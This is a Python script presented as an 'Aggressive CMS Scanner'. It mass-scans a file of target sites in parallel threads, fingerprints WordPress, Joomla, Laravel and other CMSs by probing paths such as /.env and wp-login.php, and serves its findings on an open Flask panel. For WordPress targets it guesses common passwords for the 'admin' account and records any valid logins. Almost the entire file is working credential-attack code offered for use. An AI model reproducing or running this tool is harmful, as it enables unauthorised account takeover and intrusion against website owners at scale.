'''coded by Raymond7'''
'''lets hunt'''

import requests
import threading
from queue import Queue
from flask import Flask, jsonify

# Suppress warnings
requests.packages.urllib3.disable_warnings()

# CMS signatures
CMS_SIGNATURES = {
    "WordPress": ["/wp-login.php", "/wp-admin/", "/xmlrpc.php"],
    "Joomla": ["/administrator/", "/language/en-GB/en-GB.xml"],
    "Laravel": ["/.env", "/vendor/phpunit/phpunit/phpunit"],
    "Magento": ["/admin/", "/magento_version"],
    "PrestaShop": ["/admin-dev/", "/modules/"],
    "Drupal": ["/core/install.php", "/CHANGELOG.txt"],
    "OpenCart": ["/admin/index.php", "/catalog/view/theme/default/template/common/home.tpl"]
}

scan_results = []
TARGETS = Queue()

# Flask setup
app = Flask(__name__)

@app.route("/results")
def get_results():
    return jsonify(scan_results)

def detect_cms(url):
    try:
        for cms, paths in CMS_SIGNATURES.items():
            for path in paths:
                r = requests.get(url + path, verify=False, timeout=5)
                if r.status_code in [200, 401, 403]:
                    result = f"[+] {url} → {cms} (found: {path})"
                    color = {
                        "WordPress": "\033[94m",      # Blue
                        "Joomla": "\033[92m",         # Green
                        "PrestaShop": "\033[95m",     # Purple
                        "Magento": "\033[90m",        # Gray
                        "Drupal": "\033[91m",         # Red
                        "OpenCart": "\033[95;1m"      # Pink (bright magenta)
                    }.get(cms, "\033[0m")
                    print(f"{color}{result}\033[0m")
                    scan_results.append({"url": url, "cms": cms, "info": result})
                    return cms
        msg = f"[-] {url} CMS not identified."
        print(msg)
        scan_results.append({"url": url, "cms": None, "info": msg})
        return None
    except requests.RequestException:
        msg = f"[!] {url} unreachable."
        print(msg)
        scan_results.append({"url": url, "cms": None, "info": msg})
        return None

def brute_force_stub(url, cms):
    if cms == "WordPress":
        login_url = url + "/wp-login.php"
        username = "admin"
        passwords = ["admin", "123456", "password", "admin123"]
        print(f"[*] Brute-force stub: {url}")
        for pwd in passwords:
            try:
                r = requests.post(login_url, data={"log": username, "pwd": pwd}, allow_redirects=False, timeout=5)
                if "wp-admin" in r.headers.get("Location", ""):
                    msg = f"[+] VALID LOGIN FOUND: {username}:{pwd} at {url}"
                    print(msg)
                    scan_results.append({"url": url, "cms": cms, "info": msg})
                    break
            except:
                continue

def worker():
    while not TARGETS.empty():
        target = TARGETS.get()
        url = target if target.startswith("http") else f"http://{target}"
        cms = detect_cms(url)
        brute_force_stub(url, cms)
        TARGETS.task_done()

def load_targets_from_file(file):
    with open(file) as f:
        for line in f:
            entry = line.strip()
            if entry:
                TARGETS.put(entry)

def run_flask():
    app.run(host="0.0.0.0", port=5000)

def banner():
    print(r"""
   _____ ____  __  __  ____   ___   ___   ___  
  / ____/ __ \|  \/  |/ __ \ / _ \ / _ \ / _ \ 
 | |   | |  | | \  / | |  | | | | | | | | | | |
 | |___| |__| | |\/| | |__| | |_| | |_| | |_| |
  \_____\____/|_|  |_|\____/ \___/ \___/ \___/ 
      Aggressive CMS Scanner v2- by Sean
""")

def menu():
    print("1. Single Scan")
    print("2. Mass Scan (from file)")
    print("3. Exit")
    return input("Select option: ")

def single_scan():
    url = input("Enter target URL (with or without http): ").strip()
    url = url if url.startswith("http") else f"http://{url}"
    cms = detect_cms(url)
    brute_force_stub(url, cms)
    print("[✓] Single scan complete.")

def mass_scan():
    path = input("Enter path to targets.txt: ").strip()
    threads = int(input("Number of threads: ").strip())
    enable_web = input("Enable live panel? (y/n): ").lower() == 'y'

    print("[*] Loading targets...")
    load_targets_from_file(path)

    if enable_web:
        threading.Thread(target=run_flask, daemon=True).start()
        print("[*] Live panel available at http://localhost:5000/results")

    print(f"[*] Starting scanner with {threads} threads...\n")
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()

    TARGETS.join()
    print("\n[✓] Mass scan complete.")

def main():
    banner()
    while True:
        choice = menu()
        if choice == '1':
            single_scan()
        elif choice == '2':
            mass_scan()
        elif choice == '3':
            print("Goodbye!")
            break
        else:
            print("Invalid option.\n")

if __name__ == "__main__":
    main()
